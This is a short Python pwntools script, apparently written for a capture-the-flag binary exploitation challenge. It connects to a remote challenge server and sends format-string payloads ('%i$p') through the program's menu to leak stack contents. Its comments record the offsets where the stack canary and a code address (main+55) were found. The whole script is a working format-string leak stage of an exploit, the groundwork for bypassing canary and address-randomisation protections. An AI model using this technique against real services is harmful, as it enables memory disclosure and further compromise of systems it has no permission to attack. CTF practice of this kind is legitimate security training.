#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './what_does_the_f_say'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host, port = '159.65.60.16', 31122


# =========================================================
#                           FUZZ
# =========================================================

for i in range(1, 30): # Range is obtained by fuzzing locally 
    try:
        # Connect to server
        io = remote(host, port)
        # io = process(exe)
        # set up
        io.sendlineafter(b'Space food', b'1')
        io.sendlineafter(b'(70.00 s.rocks)', b'2')
        # Format the payload to location on stack
        io.sendlineafter(b'Kryptonite?', f'%{i}$p'.encode())  
        # receive leaked
        io.recvline()
        leak = io.recvline()[:-1]
        print(f'stack at-{i}' + ": " + str(leak))
        io.close()
    except EOFError:
        io.close()

# Canary found at 17th Stack both locally and remote
# Main+55 found at 19th Stack both locally and remote